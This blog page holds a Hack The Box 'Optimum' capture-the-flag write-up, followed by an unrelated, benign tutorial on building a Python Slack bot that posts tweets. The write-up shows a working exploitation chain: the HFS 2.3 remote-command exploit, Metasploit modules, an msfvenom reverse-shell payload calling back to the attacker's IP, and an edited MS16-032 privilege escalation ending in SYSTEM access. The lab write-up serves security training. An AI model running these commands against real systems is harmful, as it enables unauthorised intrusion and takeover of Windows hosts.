<pre>Nmap scan report for 10.10.10.8
Host is up (0.42s latency).
Not shown: 999 filtered ports
PORT STATE SERVICE VERSION
80/tcp open http HttpFileServer httpd 2.3
|_http-server-header: HFS 2.3
|_http-title: HFS /
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 112.77 seconds</pre>
<p>So only port 80 was open and it was a HttpFileServer.</p>
<p><em><b>HTTP File Server</b>, otherwise known as HFS, is a free web server specifically designed for publishing and sharing files. The complete feature set differs from other web servers; it lacks some common features, like CGI, or even </em>ability<em> to run as a Windows service, but includes, for example, counting file downloads. It is even advised against using it as an ordinary web server.<br></em></p>
<p><em>Source:</em> https://en.wikipedia.org/wiki/HTTP_File_Server</p>
<p>I opened the service on the web browser and it was just a dashboard of the HFS.</p>
<p>The version of the HFS was 2.3 so I searchploited it.</p>
<pre>root@kali:~/Documents/HTB/Optimum# searchsploit hfs
------------------------------------------------------------------------------------------------- ----------------------------------
 Exploit Title | Path
 | (/usr/share/exploitdb/platforms/)
------------------------------------------------------------------------------------------------- ----------------------------------
Apple Mac OSX 10.4.8 - DMG HFS+ DO_HFS_TRUNCATE Denial of Service | osx/dos/29454.txt
Apple Mac OSX 10.6 - HFS FileSystem Exploit (Denial of Service) | osx/dos/12375.c
Apple Mac OSX 10.6.x - HFS Subsystem Information Disclosure | osx/local/35488.c
Apple Mac OSX xnu 1228.x - (hfs-fcntl) Kernel Privilege Escalation | osx/local/8266.txt
FHFS - FTP/HTTP File Server 2.1.2 Remote Command Execution | windows/remote/37985.py
Linux Kernel 2.6.x - SquashFS Double-Free Denial of Service | linux/dos/28895.txt
Rejetto HTTP File Server (HFS) - Remote Command Execution (Metasploit) | windows/remote/34926.rb
Rejetto HTTP File Server (HFS) 1.5/2.x - Multiple Vulnerabilities | windows/remote/31056.py
Rejetto HTTP File Server (HFS) 2.2/2.3 - Arbitrary File Upload | multiple/remote/30850.txt
Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (1) | windows/remote/34668.txt
Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2) | windows/remote/39161.py
Rejetto HTTP File Server (HFS) 2.3a/2.3b/2.3c - Remote Command Execution | windows/webapps/34852.txt
------------------------------------------------------------------------------------------------- ----------------------------------</pre>
<p>So there were multiple exploits available for HFS version 2.3.</p>
<p>The first exploit that I used was this.</p>
<pre>Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2) | windows/remote/39161.py</pre>
<p>I copied the exploit and named it as exploit.py on my directory. After I copied the exploit, I modified a few lines of codes and entered my IP address and local port number to listen to.</p>
<pre>root@kali:~/Documents/HTB/Optimum# nano exploit.py

# changed the following lines
ip_addr = "10.10.14.116" #local IP address
local_port = "9999" # Local Port number

root@kali:~/Documents/HTB/Optimum# python exploit.py 
[.]Something went wrong..!
Usage is :[.] python exploit.py &lt;Target IP address&gt; &lt;Target Port Number&gt;
Don't forgot to change the Local IP address and Port number on the script
root@kali:~/Documents/HTB/Optimum# python exploit.py 10.10.10.8 80

# Open new Terminal Tab
root@kali:~/Documents/HTB/Optimum# nc -lvp 9999</pre>
<p>After running the exploit and opened a new terminal for the netcat listener, I got an access to the shell. This means that the exploit worked, however, I was not able to do other things so I need to have a meterpreter access to run the privilege escalation suggester and use the suggested privesc exploits to have a root access on the system.</p>
<p>Good thing there was a metasploit module of the HFS exploit. So I fired up metasploit and used the exploit.</p>
<pre>msf &gt; search hfs

Matching Modules
================

Name Disclosure Date Rank Description
 ---- --------------- ---- -----------
 exploit/multi/http/git_client_command_exec 2014-12-18 excellent Malicious Git and Mercurial HTTP Server For CVE-2014-9390
 exploit/windows/http/rejetto_hfs_exec 2014-09-11 excellent Rejetto HttpFileServer Remote Command Execution</pre>
<pre>msf &gt; use exploit/windows/http/rejetto_hfs_exec
msf exploit(rejetto_hfs_exec) &gt; set RHOST 10.10.10.8
RHOST =&gt; 10.10.10.8
msf exploit(rejetto_hfs_exec) &gt; set SRVPORT 7777
SRVPORT =&gt; 7777
msf exploit(rejetto_hfs_exec) &gt; run

[*] Started reverse TCP handler on 10.10.14.116:4444 
[*] Using URL: http://0.0.0.0:7777/YqQuLmjEaXD
[*] Local IP: http://192.168.8.102:7777/YqQuLmjEaXD
[*] Server started.
[*] Sending a malicious request to /
[*] Payload request received: /YqQuLmjEaXD
[*] Sending stage (179267 bytes) to 10.10.10.8
[*] Meterpreter session 1 opened (10.10.14.116:4444 -&gt; 10.10.10.8:49239) at 2017-10-14 09:51:34 -0400
[*] Server stopped.
[!] This exploit may require manual cleanup of '%TEMP%\pCrVCNhk.vbs' on the target</pre>
<p>Got a meterpreter session.</p>
<pre>meterpreter &gt;
meterpreter &gt; sysinfo
Computer : OPTIMUM
OS : Windows 2012 R2 (Build 9600).
Architecture : x64
System Language : el_GR
Domain : HTB
Logged On Users : 1
Meterpreter : x86/windows</pre>
<p>I needed to background first the session so that I am able to run the exploit suggester for windows.</p>
<pre>meterpreter &gt; background
[*] Backgrounding session 1...

msf exploit(rejetto_hfs_exec) &gt; search suggester

Matching Modules
================

Name Disclosure Date Rank Description
---- --------------- ---- -----------
post/multi/recon/local_exploit_suggester normal Multi Recon Local Exploit Suggester

msf exploit(rejetto_hfs_exec) &gt; use post/multi/recon/local_exploit_suggester
msf post(local_exploit_suggester) &gt; set SESSION 1
SESSION =&gt; 1
msf post(local_exploit_suggester) &gt; run

[*] 10.10.10.8 - Collecting local exploits for x86/windows...
[*] 10.10.10.8 - 37 exploit checks are being tried...
[+] 10.10.10.8 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
[+] 10.10.10.8 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The target service is running, but could not be validated.
[+] 10.10.10.8 - exploit/windows/local/ms_ndproxy: The target service is running, but could not be validated.
[*] Post module execution completed
msf post(local_exploit_suggester) &gt; use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
msf exploit(ms16_032_secondary_logon_handle_privesc) &gt; 
msf exploit(ms16_032_secondary_logon_handle_privesc) &gt; run
msf exploit(ms16_032_secondary_logon_handle_privesc) &gt; set SESSION 2
[*] Started reverse TCP handler on 192.168.8.102:4444 
[!] Executing 32-bit payload on 64-bit ARCH, using SYSWOW64 powershell
[*] Writing payload file, C:\Users\kostas\Desktop\cbOzoCyJAykO.txt...
[*] Compressing script contents...
[+] Compressed size: 3596
[*] Executing exploit script...

[+] Cleaned up C:\Users\kostas\Desktop\cbOzoCyJAykO.txt
[*] Exploit completed, but no session was created.
msf exploit(ms16_032_secondary_logon_handle_privesc) &gt;</pre>
<p>The ms16_032_secondary_logon_handle_privesc exploit was an exploit for Windows 2012 R2 (Build 9600) but it didn&#8217;t work and there was no session created. However, there was a manual exploit script for the ms16_032_secondary_logon_handle_privesc and I will use that exploit to have a root access on the system.</p>
<p>So I downloaded the exploit from exploitdb.</p>
<p>https://www.exploit-db.com/exploits/39719/</p>
<p>The exploit was a powershell script. So for the exploit to work, I needed to have an interactive powershell access on the system to run the script, so what I did was to create a reverse powershell payload using msfvenom.</p>
<pre>root@kali:~/Documents/HTB/Optimum# msfvenom -p windows/x64/powershell_reverse_tcp LHOST=10.10.14.116 LPORT=5555 -f exe &gt; shell.exe
No platform was selected, choosing Msf::Module::Platform::Windows from the payload
No Arch selected, selecting Arch: x64 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 1802 bytes
Final size of exe file: 8192 bytes</pre>
<p>After the payload was created, I fired up metasploit on the other tab to use the handler to catch the reverse powershell.</p>
<p>Reverse Powershell Tab</p>
<pre>msf &gt; use exploit/multi/handler
msf exploit(handler) &gt; set payload payload/windows/x64/powershell_reverse_tcp
[-] The value specified for payload is not valid.
msf exploit(handler) &gt; set payload windows/x64/powershell_reverse_tcp
payload =&gt; windows/x64/powershell_reverse_tcp
msf exploit(handler) &gt; set LHOST 10.10.14.116
LHOST =&gt; 10.10.14.116
msf exploit(handler) &gt; set LPORT 5555
LPORT =&gt; 5555
msf exploit(handler) &gt; exploit -j -z
[*] Exploit running as background job 0.
msf exploit(handler) &gt; 
[*] Started reverse SSL handler on 10.10.14.116:5555

msf exploit(handler) &gt;</pre>
<p>After creating the handler I uploaded and executed the reverse powershell.</p>
<pre>meterpreter &gt; pwd
C:\Users\kostas\Desktop
meterpreter &gt; upload shell.exe
[*] uploading : shell.exe -&gt; shell.exe
[*] uploaded : shell.exe -&gt; shell.exe
meterpreter &gt; execute -f shell.exe</pre>
<p>On the Reverse Powershell Tab, I got a powershell session.</p>
<pre>msf exploit(handler) &gt; [*] Powershell session session 2 opened (10.10.14.116:5555 -&gt; 10.10.10.8:49251) at 2017-10-14 10:22:40 -0400</pre>
<p>So it&#8217;s time to modify the ms16-032 script to work.</p>
<pre># LOGON_NETCREDENTIALS_ONLY / CREATE_SUSPENDED
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$CallResult = [Advapi32]::CreateProcessWithLogonW(
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"user", "domain", "pass",
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>0x00000002, "C:\Windows\System32\cmd.exe", "", #change this to your reverse shell.</strong>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x00000004, $null, $GetCurrentPath,
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[ref]$StartupInfo, [ref]$ProcessInfo)</pre>
<p>I needed to create another reverse shell using msfvenom and change a few line of codes in the ms16-032 script to execute the reverse shell as root.</p>
<pre># LOGON_NETCREDENTIALS_ONLY / CREATE_SUSPENDED
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$CallResult = [Advapi32]::CreateProcessWithLogonW(
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"user", "domain", "pass",
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>0x00000002, "C:\Users\kostas\Desktop\yourrevshell.exe", "", #changed</strong>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x00000004, $null, $GetCurrentPath,
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[ref]$StartupInfo, [ref]$ProcessInfo)</pre>
<p>I needed to open another handler again on metasploit to catch the reverse shell and to have a root access on the system.</p>
<p>And after modifying the script and creating the handler, it&#8217;s time to execute the exploit using the interactive powershell.</p>
<p><strong>Reverse Powershell Tab</strong></p>
<pre>PS C:\Users\kostas\Desktop&gt; ./MS16-032.ps1
PS C:\Users\kostas\Desktop&gt; Import-Module ./MS16-032.ps1
PS C:\Users\kostas\Desktop&gt; Invoke-MS16-032
__ __ ___ ___ ___ ___ ___ ___ 
| V | _|_ | | _|___| |_ |_ |
| |_ |_| |_| . |___| | |_ | _|
|_|_|_|___|_____|___| |___|___|___|
 
[by b33f -&gt; @FuzzySec]

[?] Operating system core count: 2
[&gt;] Duplicating CreateProcessWithLogonW handle
[?] Done, using thread handle: 2172

[*] Sniffing out privileged impersonation token..

[?] Thread belongs to: svchost
[+] Thread suspended
[&gt;] Wiping current impersonation token
[&gt;] Building SYSTEM impersonation token
[?] Success, open SYSTEM token handle: 2168
[+] Resuming thread..

[*] Sniffing out SYSTEM shell..

[&gt;] Duplicating SYSTEM token
[&gt;] Starting token race
[&gt;] Starting process race
[!] Holy handle leak Batman, we have a SYSTEM shell!!

PS C:\Users\kostas\Desktop&gt;</pre>
<p>And on the reverse shell handler tab, you can see that it already caught the reverse shell executed by the exploit and there it goes, I already had a root access on the system.</p>
<p><strong>Reverse Shell Tab</strong></p>
<pre>msf exploit(handler) &gt; 
[*] Sending stage (179267 bytes) to 10.10.10.8
[*] Meterpreter session 2 opened (10.10.14.116:1337 -&gt; 10.10.10.8:50253) at 2017-10-14 12:23:26 -0400

msf exploit(handler) &gt; sessions -i 1
[*] Starting interaction with 1...

meterpreter &gt; shell
Process 752 created.
Channel 1 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Users\kostas\Desktop&gt;whoami
whoami
nt authority\system

C:\Users\kostas\Desktop&gt;more user.txt.txt
more user.txt.txt
d0c39409d7b994a9a1389ebf38ef5f73

C:\Users\kostas\Desktop&gt;cd C:\Users
cd C:\Users

C:\Users&gt;cd Administrator
cd Administrator

C:\Users\Administrator&gt;cd Desktop
cd Desktop

C:\Users\Administrator\Desktop&gt;more root.txt
more root.txt
51ed1b36553c8461f4552c2e92b3eeed

C:\Users\Administrator\Desktop&gt;</pre>
<p>I have now the user and root hashes of the box.</p>


<hr class="wp-block-separator">



<p><strong>Subscribe for more!</strong></p>



<p>To stay up to date with my latest posts and more InfoSec guides, make sure to subscribe to this blog by entering your email address below.</p>


	<div class="wp-block-jetpack-subscriptions__supports-newline wp-block-jetpack-subscriptions">
		<div class="wp-block-jetpack-subscriptions__container is-not-subscriber">
							<form action="https://wordpress.com/email-subscriptions" method="post" accept-charset="utf-8" data-blog="174576423" data-post_access_level="everybody" data-subscriber_email="" id="subscribe-blog-5">
					<div class="wp-block-jetpack-subscriptions__form-elements">
												<p id="subscribe-email">
							<label id="subscribe-field-5-label" for="subscribe-field-5" class="screen-reader-text">
								Type your emailâ€¦							</label>
							<input required="required" type="email" name="email" class="no-border-radius " style="font-size: 16px;padding: 15px 23px 15px 23px;border-radius: 0px;border-width: 1px;" placeholder="Type your emailâ€¦" value="" id="subscribe-field-5" title="Please fill in this field.">						</p>
												<p id="subscribe-submit">
							<input type="hidden" name="action" value="subscribe">
							<input type="hidden" name="blog_id" value="174576423">
							<input type="hidden" name="source" value="/?simply_static_page=1">
							<input type="hidden" name="sub-type" value="subscribe-block">
							<input type="hidden" name="app_source" value="">
							<input type="hidden" name="redirect_fragment" value="subscribe-blog-5">
							<input type="hidden" name="lang" value="en_US">
							<input type="hidden" id="_wpnonce" name="_wpnonce" value="b537a8bb39"><input type="hidden" name="_wp_http_referer" value="/?simply_static_page=1"><input type="hidden" name="post_id" value="1097">							<button type="submit" class="wp-block-button__link no-border-radius" style="font-size: 16px;padding: 15px 23px 15px 23px;margin: 0; margin-left: 10px;border-radius: 0px;border-width: 1px;" name="jetpack_subscriptions_widget">
								Subscribe							</button>
						</p>
					</div>
				</form>
								</div>
	</div>
	


<p>I promise I won&#8217;t be spamming your mailbox. Because no one loves spam. AMIRIGHT?</p>



<figure class="wp-block-image size-large"><img data-recalc-dims="1" loading="lazy" decoding="async" width="768" height="576" src="https://i0.wp.com/anotsodev.me/wp-content/uploads/2020/04/more-spam.gif?resize=768%2C576&#038;ssl=1" alt="" class="wp-image-1602"></figure>
	</div>
<!-- .entry-content -->

	<footer class="entry-footer">
		<span class="cat-links">Posted in <a href="/category/ctf/" rel="category tag">Capture The Flag</a>, <a href="/category/hack-the-box/" rel="category tag">Hack the Box</a>, <a href="/category/pentesting/" rel="category tag">Penetration Testing</a>, <a href="/category/writeups/" rel="category tag">Writeups</a></span> | <span class="tags-links">Tagged <a href="/tag/hackthebox/" rel="tag">hackthebox</a>, <a href="/tag/optimum/" rel="tag">optimum</a>, <a href="/tag/writeup/" rel="tag">writeup</a></span>	</footer><!-- .entry-footer -->
</article><!-- #post-## -->

<article id="post-809" class="post-809 post type-post status-publish format-standard has-post-thumbnail hentry category-programming category-tutorials tag-bot tag-slack tag-tutorial no-featured-image-padding">
	<div class="post-thumbnail">
		<img width="3000" height="3000" src="/wp-content/uploads/2017/09/programming.png" class="attachment-post-thumbnail size-post-thumbnail wp-post-image" alt="" decoding="async" loading="lazy" srcset="https://i0.wp.com/anotsodev.me/wp-content/uploads/2017/09/programming.png?w=3000&amp;ssl=1 3000w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2017/09/programming.png?resize=300%2C300&amp;ssl=1 300w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2017/09/programming.png?resize=1024%2C1024&amp;ssl=1 1024w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2017/09/programming.png?resize=150%2C150&amp;ssl=1 150w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2017/09/programming.png?resize=768%2C768&amp;ssl=1 768w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2017/09/programming.png?resize=1536%2C1536&amp;ssl=1 1536w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2017/09/programming.png?resize=2048%2C2048&amp;ssl=1 2048w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2017/09/programming.png?w=2340&amp;ssl=1 2340w" sizes="auto, (max-width: 3000px) 100vw, 3000px">	</div>
	<header class="entry-header">
		<h2 class="entry-title"><a href="/building-a-slack-bot-with-python/" rel="bookmark">Building a Slack Bot with Python</a></h2>		<div class="entry-meta">
			<span class="posted-on">Posted on <a href="/building-a-slack-bot-with-python/" rel="bookmark"><time class="entry-date published" datetime="2017-09-28T18:04:26+08:00">September 28, 2017</time></a></span> | <span class="byline"> by <span class="author vcard"><a class="url fn n" href="/author/anotsodev/">anotsodev</a></span></span> | <span class="comments-link"><i class="fa fa-comments" aria-hidden="true"></i> <a href="/building-a-slack-bot-with-python/#respond">Leave a Comment<span class="screen-reader-text"> on Building a Slack Bot with Python</span></a></span>		</div>
<!-- .entry-meta -->
			</header><!-- .entry-header -->
	<div class="entry-content">
		<p>The slack bot that I will be building has a feature that will automatically fetch the latest tweets from my subscribed lists (Information Security related) on Twitter.</p>
<p>Thanks to this guide I was able to understand how to build a simple slack bot.</p>
<p>https://www.fullstackpython.com/blog/build-first-slack-bot-python.html</p>
<h2>Requirements</h2>
<ol>
<li><span style="text-decoration: underline;">Python 2.x.x or 3.x.x</span></li>
<li>
<span style="text-decoration: underline;">Slack Account</span> with a workspace to access the slack API</li>
<li>
<span style="text-decoration: underline;">slackclient</span> python library</li>
<li>
<span style="text-decoration: underline;">Twitter account</span> for the API access and <span style="text-decoration: underline;">subscribed with at least 1 list</span>
</li>
<li>
<span style="text-decoration: underline;">twitter</span> python library</li>
</ol>
<h2>Getting Started</h2>
<p>After installing either Python 2.x.x or 3.x.x, use the following commands to install the needed python libraries.</p>
<pre>pip install slack client
pip install twitter</pre>
<h2>Getting the Slack API Access Token</h2>
<p>After running the following commands, login to slack and make a workspace for you to be able to generate Slack API Tokens.</p>
<p>Click the site below to create new bot user.</p>
<p>https://api.slack.com/bot-users</p>
<p>Click the &#8220;creating a new bot user&#8221; to create a new bot user.</p>
<p>Below is the screenshot on creating a new bot user.</p>
<p><img data-recalc-dims="1" loading="lazy" decoding="async" class="alignnone size-full wp-image-881" src="https://i0.wp.com/anotsodev.me/wp-content/uploads/2017/09/screenshot-2017-9-28-bot-users.png?resize=654%2C365&#038;ssl=1" alt="Screenshot-2017-9-28 Bot Users" width="654" height="365" srcset="https://i0.wp.com/anotsodev.me/wp-content/uploads/2017/09/screenshot-2017-9-28-bot-users.png?w=654&amp;ssl=1 654w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2017/09/screenshot-2017-9-28-bot-users.png?resize=300%2C167&amp;ssl=1 300w" sizes="auto, (max-width: 654px) 100vw, 654px"></p>
<p>Enter the username of your bot.</p>
<p><img data-recalc-dims="1" loading="lazy" decoding="async" class="alignnone size-full wp-image-884" src="https://i0.wp.com/anotsodev.me/wp-content/uploads/2017/09/screenshot-2017-9-28-bots.png?resize=960%2C557&#038;ssl=1" alt="Screenshot-2017-9-28 Bots" width="960" height="557" srcset="https://i0.wp.com/anotsodev.me/wp-content/uploads/2017/09/screenshot-2017-9-28-bots.png?w=960&amp;ssl=1 960w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2017/09/screenshot-2017-9-28-bots.png?resize=300%2C174&amp;ssl=1 300w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2017/09/screenshot-2017-9-28-bots.png?resize=768%2C446&amp;ssl=1 768w" sizes="auto, (max-width: 960px) 100vw, 960px"></p>
<p>You will be redirected here after you clicked the Add bot integration button.</p>
<p><img data-recalc-dims="1" loading="lazy" decoding="async" class="alignnone size-full wp-image-899" src="https://i0.wp.com/anotsodev.me/wp-content/uploads/2017/09/screenshot-2017-9-28-bots-slack-app-directory.png?resize=970%2C473&#038;ssl=1" alt="Screenshot-2017-9-28 Bots Slack App Directory" width="970" height="473" srcset="https://i0.wp.com/anotsodev.me/wp-content/uploads/2017/09/screenshot-2017-9-28-bots-slack-app-directory.png?w=970&amp;ssl=1 970w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2017/09/screenshot-2017-9-28-bots-slack-app-directory.png?resize=300%2C146&amp;ssl=1 300w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2017/09/screenshot-2017-9-28-bots-slack-app-directory.png?resize=768%2C374&amp;ssl=1 768w" sizes="auto, (max-width: 970px) 100vw, 970px"></p>
<p>You have now the API token for your bot. Please note the warning message.</p>
<p>You can also customize your bot like uploading a profile picture and describing the features of your bot. After customizing your bot, scroll down and click the Save Integration button.</p>
<p>The most practical method of securing secret tokens it to export it as an environment variable.</p>
<pre>export SLACK_BOT_TOKEN='your slack token pasted here'</pre>
<p>But what I will be doing is paste the token to a config.py file and access it using the python file of the bot.</p>
<h2>Getting the Bot&#8217;s ID</h2>
<p>Here is the modified code snippet from https://www.fullstackpython.com/blog/build-first-slack-bot-python.html</p>
<pre>import os
from slackclient import SlackClient

config = {}
execfile("config.py", config)

BOT_NAME = 'kairubot'

slack_client = SlackClient(config['slack_api'])

if __name__ == "__main__":
    api_call = slack_client.api_call("users.list")
    if api_call.get('ok'):
    # retrieve all users so we can find our bot
    users = api_call.get('members')
       for user in users:
          if 'name' in user and user.get('name') == BOT_NAME:
              print("Bot ID for '" + user['name'] + "' is " + user.get('id'))
          else:
              print("could not find bot user with the name " + BOT_NAME)</pre>
<p>Running this program will output the Bot&#8217;s ID.</p>
<pre>C:\Users\Kyle\Documents\Projects\slack-bot&gt;python test.py
Bot ID for 'kairubot' is U79K9K9FB</pre>
<p>You can now copy and paste the ID of your bot to the config.py file.</p>
<p>Below is the template of the config.py file.</p>
<pre># Twitter Access Tokens
consumer_key = ""
consumer_secret = ""
access_key = ""
access_secret = ""

# Slack Access Tokens
slack_api = ""
bot_id = "U772P5C83"</pre>
<h2>Getting the Twitter Access Tokens</h2>
<p>Now we already have our Slack API Token for our bot and the ID of our bot, next step is to get the tokens for user authentication needed to use the Twitter API.</p>
<p>Click the link below to generate these tokens.</p>
<p>https://apps.twitter.com/app/new</p>
<p>You must be logged in on twitter before creating an application.</p>
<p>You just need to fill up the following fields to create your new application.</p>
<p><img data-recalc-dims="1" loading="lazy" decoding="async" class="alignnone size-full wp-image-963" src="https://i0.wp.com/anotsodev.me/wp-content/uploads/2017/09/screenshot-2017-9-28-twitter-application-management.png?resize=1058%2C657&#038;ssl=1" alt="Screenshot-2017-9-28 Twitter Application Management" width="1058" height="657" srcset="https://i0.wp.com/anotsodev.me/wp-content/uploads/2017/09/screenshot-2017-9-28-twitter-application-management.png?w=1058&amp;ssl=1 1058w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2017/09/screenshot-2017-9-28-twitter-application-management.png?resize=300%2C186&amp;ssl=1 300w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2017/09/screenshot-2017-9-28-twitter-application-management.png?resize=1024%2C636&amp;ssl=1 1024w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2017/09/screenshot-2017-9-28-twitter-application-management.png?resize=768%2C477&amp;ssl=1 768w" sizes="auto, (max-width: 1058px) 100vw, 1058px"></p>
<p>After filling up the necessary fields and created your new application, you will be redirected to your application&#8217;s management page. In order to generate your access tokens, click the Keys and Access Tokens tab then scroll down then click the create new access token button there.</p>
<p>Your application now has generated your access tokens. You just need to paste the tokens on the config.py</p>
<p>Example config.py</p>
<pre># Twitter Access Tokens
consumer_key = "k1v..."
consumer_secret = "HsDc..."
access_key = "770..."
access_secret = "5UN..."

#Slack Access Tokens
slack_api = "xoxb-"
bot_id = "U772P5C83"</pre>
<p>You now have the necessary tokens to make an API requests to Slack and Twitter.</p>
<p>You can now use the source code of the program below to use and retrieve latest tweets from the subscribed lists.</p>
<p>I&#8217;ve used the examples here on how to use the Twitter API to get tweets from Twitter.</p>
<p>https://github.com/ideoforms</p>
<p>The feature of this bot is to manually or automatically fetch latest tweets from the subscribed lists.</p>
<pre>import time
import sys
from slackclient import SlackClient
from twitter import *

config = {}
execfile("config.py", config)

#bot's id 
BOT_ID = config["bot_id"]

# instantiate slack
# Note: always secure the api token
slack_client = SlackClient(config["slack_api"])

AT_BOT = "&lt;@" + BOT_ID + "&gt;"

# list of commands
EXAMPLE_COMMANDS = "help, retrieve, autoretrieve"
COMMANDS = ['help', 'retrieve', 'autoretrieve']

#constants
DEFAULT_INTERVAL = 5

def auto_retrieve(channel, start, default_interval):
	n = default_interval;
	response = "Starting...\n"
	time.sleep(3)
	response += "Will retrieve statuses from the infosec list every 1 hour. Auto Retrieve Intervals = "+str(DEFAULT_INTERVAL)+"\n"
	slack_client.api_call("chat.postMessage", channel=channel,
							  	text=response, as_user=True)
	while start and n &gt; 0:
		response = retrieve()
		slack_client.api_call("chat.postMessage", channel=channel,
							  	text=response, as_user=True)
		n-=1
		# 3600 seconds = 1 hour
		time.sleep(3600)
	return "Auto retrieval stopped."

def retrieve():
	# will use this example on retrieving tweets https://github.com/ideoforms/python-twitter-examples/blob/master/twitter-home-timeline.py
	# config.py https://github.com/ideoforms/python-twitter-examples/blob/master/config.py
	response = ""
	response += "Retrieving 50 tweets... \n\n"

	users = [ "kylehalog" ]

	twitter = Twitter(auth = OAuth(config["access_key"], config["access_secret"], config["consumer_key"], config["consumer_secret"]))

	for user in users:
		result = twitter.lists.list(screen_name = user)
		for list in result:
			list_slug = list["slug"]
			list_str_id = list["id"]
			tweet_count = 50
			statuses = twitter.lists.statuses(slug = list_slug, list_id = list_str_id, count = tweet_count)
			for status in statuses:
				response += "(%s) @%s %s" % (status["created_at"], status["user"]["screen_name"], status["text"]) + "\n"
	return response

def command_handler(command, channel):

	response = "Sorry but I don't get what you mean. I can only understand these commands: " + EXAMPLE_COMMANDS
	if command in COMMANDS:
		if command == 'help':
			response = "\
			List of available commands: \n \
			help - display this message\n \
			retrieve - retrieve and output the latest tweets about infosec\n \
			autoretrieve - automatically retrieve and output tweets about infosec every 1 hour"
		
		elif command == 'retrieve':
			response = retrieve()

		elif command == 'autoretrieve':
			response = auto_retrieve(channel, True, DEFAULT_INTERVAL)
			
				
	slack_client.api_call("chat.postMessage", channel=channel,
						  text=response, as_user=True)
def slack_output_parser(rtm_output):
	
	output_list = rtm_output
	if output_list and len(output_list) &gt; 0:
		for output in output_list:
			if output and 'text' in output and AT_BOT in output['text']:
				# return text after the @ mention, whitespace removed
				return output['text'].split(AT_BOT)[1].strip().lower(), \
					   output['channel']
	return None, None

if __name__ == "__main__":
	READ_WEBSOCKET_DELAY = 1
	if slack_client.rtm_connect():
		print("Kairu Bot is connected and running!")
		while True:
			command, channel = slack_output_parser(slack_client.rtm_read())
			if command and channel:
				command_handler(command, channel)
			time.sleep(READ_WEBSOCKET_DELAY)
	else:
		print("Connection Failed. Invalid Slack token or Bot ID")</pre>
<h2>Starting the Bot</h2>
<p>To run the program, just use this command and invite your bot to your slack channel.</p>
<pre>python kairu-bot.py</pre>
<p>Example bot usage on slack</p>
<p><img data-recalc-dims="1" loading="lazy" decoding="async" class="alignnone size-full wp-image-1000" src="https://i0.wp.com/anotsodev.me/wp-content/uploads/2017/09/screenshot-2017-9-28-supersecretchannel-project-graduate-slack.png?resize=1127%2C495&#038;ssl=1" alt="Screenshot-2017-9-28 supersecretchannel Project Graduate Slack" width="1127" height="495" srcset="https://i0.wp.com/anotsodev.me/wp-content/uploads/2017/09/screenshot-2017-9-28-supersecretchannel-project-graduate-slack.png?w=1127&amp;ssl=1 1127w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2017/09/screenshot-2017-9-28-supersecretchannel-project-graduate-slack.png?resize=300%2C132&amp;ssl=1 300w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2017/09/screenshot-2017-9-28-supersecretchannel-project-graduate-slack.png?resize=1024%2C450&amp;ssl=1 1024w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2017/09/screenshot-2017-9-28-supersecretchannel-project-graduate-slack.png?resize=768%2C337&amp;ssl=1 768w" sizes="auto, (max-width: 1127px) 100vw, 1127px"></p>
<p>So this is how to build a slack bot with python.</p>
<p>You are free to modify and use the source code on my Github below. You can also add features as many as you want.</p>
<p>https://github.com/anotsodev/slack-bot</p>
<p>Thank you for your time! ðŸ™‚</p>
<p><i>Featured Image credits to </i><i><a href="https://www.wired.com/wp-content/uploads/2015/08/SlackBot-featured1.jpg">wired.com</a></i></p>


<hr class="wp-block-separator">



<p><strong>Subscribe for more!</strong></p>



<p>To stay up to date with my latest posts and more InfoSec guides, make sure to subscribe to this blog by entering your email address below.</p>


	<div class="wp-block-jetpack-subscriptions__supports-newline wp-block-jetpack-subscriptions">
		<div class="wp-block-jetpack-subscriptions__container is-not-subscriber">
